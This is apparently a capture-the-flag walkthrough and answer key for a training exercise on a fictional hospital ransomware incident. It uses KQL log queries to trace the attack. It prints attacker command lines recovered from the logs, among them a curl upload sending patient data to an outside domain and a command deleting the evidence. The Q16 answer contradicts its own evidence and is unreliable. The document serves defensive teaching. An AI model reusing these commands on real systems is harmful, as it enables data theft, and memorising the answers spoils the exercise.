## Jojo's Hospital: A Ransomware Investigation: Crypto But The Bad Kind<br>
### **Summary**<br>
JoJo's Hospital in Lexington, Kentucky, recently faced a serious cyberattack that locked their important files. The hackers sent a message to the hospital asking for money to unlock the files. They gave a specific amount of time to pay.<br><br>

**Q1. How many hours did the hackers give the hospital to pay the ransom?**<br>
Watch the YouTube video an website, approximately 41 seconds in, the states how many hours the hospital has to pay the random.

**Answer: 72**<br><br>

**Q2. What was the name of the ransomware group?**<br><br>
From the ransom note on the website, find the name of the ransomware group.<br><br>

**Answer: lock byte**<br><br>

**Q3. The slogan was: we spend your money, so ____**<br><br>
From the ransom note on the website, the slogan can be found.<br><br>

**Answer: you don't have to**<br><br>

**Q4. How much did the hackers ask the patients to pay?**<br><br>
From the ransom note on the website, the amount demanded can be found.<br><br>

**Answer: $10,000**<br><br>

**Q5. What very important unique identifier number did the ransomware operators threaten to release?**<br><br>
From the ransom note on the website list 3 categories of data, health history, medical info and social security number.
<br><br>
The most unique identifier out of the above is the social security number.<br><br>

**Answer: social security number**<br><br>

**Q6. How many total files were encrypted at the hospital?**<br><br>
Running the query from the website returns the total files that were encrypted. <br><br>

```
FileCreationEvents
| where filename endswith ".encrypted"
| count
```
<br>

**Answer: 6420**<br><br>

**Q7. How many unique hostnames had files encrypted on them?**<br><br>
Using the query given, add hostname as the distinct field and count to total the number of hostnames.<br><br>

```
FileCreationEvents
| where filename endswith ".encrypted"
| distinct hostname
| count 
```
<br>

**Answer: 321**<br><br>

**Q8. What was the Sha256 hash of this ransom file?**<br><br>
Using the query, the sha256 can be obtained for this file.<br><br>

```
FileCreationEvents
| where filename == "We_Have_Your_Data_Pay_Up.txt"
```
<br>

**Answer: 97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018**<br><br>

**Q9. What was the full path of this ransom file?**<br><br>
Obtained from the previous query.<br><br>

**Answer: C:\Users\andavis\Documents\We_Have_Your_Data_Pay_Up.txt**<br><br>

**Q10. On how many hosts (machines) was this ransom file seen?**<br><br>
Only 1 result is returned from the query in question 8.<br><br>

**Answer: 1**<br><br>

**Q11. What hostname was the ransom note seen on?**<br><br>
Obtained from the  query in question 8.<br><br>

**Answer: AMFB-MACHINE**<br><br>

**Q12. What is the name of the employee whose host has the ransom note?**<br><br>

```
Employees
| where hostname == "AMFB-MACHINE"
```
<br>

**Answer: Anthony Davis**<br><br>

**Q13. Run the query above. How many process events were executed on Anthony's machine during this time period?**<br><br>

```
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
| count
```
<br>

**Answer: 14**<br><br>

**Q14. What was the name of the ransomer file mentioned?**<br><br>

```
ProcessEvents
| where process_commandline contains "ransomer"
```
<br>

Under the process comandline column, the file name can be obtained.<br><br>

```
cmd.exe /c copy C:\\Users\\andavis\\Downloads\\lockbyte_ransomer.exe \\jojos-hospital.org\\shared\\spread_ransomware.exe
```
<br>

**Answer:  lockbyte_ransomer.exe**<br><br>

**Q15. When the attackers copied the ransomer file to the network share, what new name did they give it?**<br><br>
From the previous query the lockbyte_ransomer.exe was copied over the jojos hospital but renamed.<br><br>

**Answer: spread_ransomware.exe**<br><br>

**Q16. What tool did the attackers use to steal the data? This will be a .exe file**<br><br>

```
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
```
<br>

Looking through the results, one exe file looks of interest that is likely responsible for sealing the data.<br><br>

```
C:\Users\andavis\Downloads\patient_data_exporter.exe /export C:\Users\andavis\Documents\patient_data_2.zip /source \\jojos-hospital-server\important_data\archive\patient-records
```
<br>

**Answer: spread_ransomware.exe**<br><br>

**Q17. What information did the attackers put into patient_data_1.zip? Provide the full path of the network share \\something\like\this**<br><br>

```
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
| where process_commandline contains "patient_data_1.zip"
```
<br>

Under the process commandline column, the directory to where the files were dropped can be found.<br><br>

```
C:\Users\andavis\Downloads\patient_data_exporter.exe /export C:\Users\andavis\Documents\patient_data_1.zip /source \\jojos-hospital-server\important_data\patient_records
```
<br>

**Answer: \\jojos-hospital-server\important_data\patient_records**<br><br>

**Q18. What information did the attackers put into patient_data_2.zip? Provide the full path of the network share \\something\like\this**<br><br>

```
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
| where process_commandline contains "patient_data_2.zip"
```
<br>

Under the process commandline column, the directory to where the files were dropped can be found.<br><br>

```
C:\Users\andavis\Downloads\patient_data_exporter.exe /export C:\Users\andavis\Documents\patient_data_2.zip /source \\jojos-hospital-server\important_data\archive\patient-records
```
<br>

**Answer: \\jojos-hospital-server\important_data\archive\patient-records**<br><br>

**Q19. What information did the attackers put into patient_data_3.zip? Provide the full path of the network share \\something\like\this**<br><br>

```
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
| where process_commandline contains "patient_data_3.zip"
```
<br>

Under the process commandline column, the directory to where the files were dropped can be found.<br><br>

```
C:\Users\andavis\Downloads\patient_data_exporter.exe /export C:\Users\andavis\Documents\patient_data_3.zip /source \\jojos-hospital-server\important_data\old-patient-data
```
<br>

**Answer: \\jojos-hospital-server\important_data\old-patient-data**<br><br>

**Q20. What domain (e.g. abcd.com) did the attackers send the stolen data to?**<br><br>
Searching for the term curl in the process command line to look for commands entered to exfiltrate the data
.<br><br>

```
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
| where process_commandline contains "curl"
```
<br>

Taking the first result, the domain can be found.<br><br>

```
cmd.exe /c curl -T C:\Users\andavis\Documents\patient_data_1.zip https://secure-health-access.com/upload/patient_data_1.zip
```
<br>

**Answer: secure-health-access.com**<br><br>

**Q21. What command did they use to clear their tracks? Copy and paste the full command.**<br><br>
Narrow down the search to look for commands use to delete their tracks.<br><br>

```
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18))
| where parent_process_name == "cmd.exe"
| where process_commandline contains "patient"
```
<br>

The last result in the process command line.<br><br>

```
cmd.exe /c del C:\Users\andavis\Documents\patient_data_*.zip
```
<br>

**Answer: cmd.exe /c del C:\Users\andavis\Documents\patient_data_*.zip**<br><br>

**Q22. What domain was the patient data exporter file downloaded from?**<br><br>
Running the given query.<br><br>

```
OutboundNetworkEvents
| where url has "patient_data_exporter.exe"
```
<br>

**Answer: secure-health-access.com**<br><br>

**Q23. When was the patient data exporter file downloaded? (copy and paste the exact timestamp)*<br><br>
Timestamp retrieved from previous query.<br><br>

**Answer: 6/17/2024, 2:22:29 PM**<br><br>

**Q24. How many distinct IPs does the domain secure-health-access.com resolve to?**<br><br>

```
PassiveDns
| where domain == "secure-health-access.com"
| distinct ip
```
<br>

**Answer: 2**<br><br>

**Q25. Which one of these IPs ends with the digit 1?**<br><br>
From the previous query.<br><br>

**Answer: 203.0.113.1**<br><br>

